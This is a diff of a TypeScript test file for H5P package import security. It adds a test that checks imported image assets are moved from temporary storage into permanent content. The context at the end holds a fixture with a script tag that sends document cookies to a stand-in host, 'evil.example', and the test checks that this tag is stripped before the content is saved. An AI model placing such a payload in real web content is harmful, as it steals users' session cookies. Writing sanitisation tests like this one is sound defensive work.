@@ -148,6 +148,37 @@ describe("H5P package import security (Finding 3, Finding 4)", () => {
     assert.equal(persisted.text, "<p>Hello safe world</p>");
   });
 
+  it(
+    "promotes package assets from temporary storage into permanent content during import",
+    async () => {
+    const assetBytes = "imported image asset";
+    const packagePath = await buildPackage(
+      "asset-import",
+      { image: { path: "images/imported.png", mime: "image/png" } },
+      {
+        extraEntry: { path: "content/images/imported.png", content: assetBytes },
+        semantics: [{ name: "image", type: "image" }],
+      },
+    );
+    const { status, body } = await importPackage(packagePath);
+    assert.equal(status, 200);
+
+    const adminUser = {
+      id: "admin",
+      name: "operator",
+      type: "local" as const,
+      email: "admin@pfy.local",
+    };
+    const persisted = await contentManager.getContentParameters(body.contentId, undefined as never);
+    const importedAssetPath = persisted.image.path.replace(/#tmp$/, "");
+    assert.match(importedAssetPath, /^images\//);
+    const stream = await contentManager.getContentFileStream(body.contentId, importedAssetPath, adminUser);
+    const chunks: Buffer[] = [];
+    for await (const chunk of stream) chunks.push(Buffer.from(chunk));
+    assert.equal(Buffer.concat(chunks).toString("utf8"), assetBytes);
+    },
+  );
+
   it("strips <script> tags before the content is ever persisted", async () => {
     const packagePath = await buildPackage("script-injection", {
       text: "<p>Safe</p><script>fetch('https://evil.example/steal?c='+document.cookie)</script>",
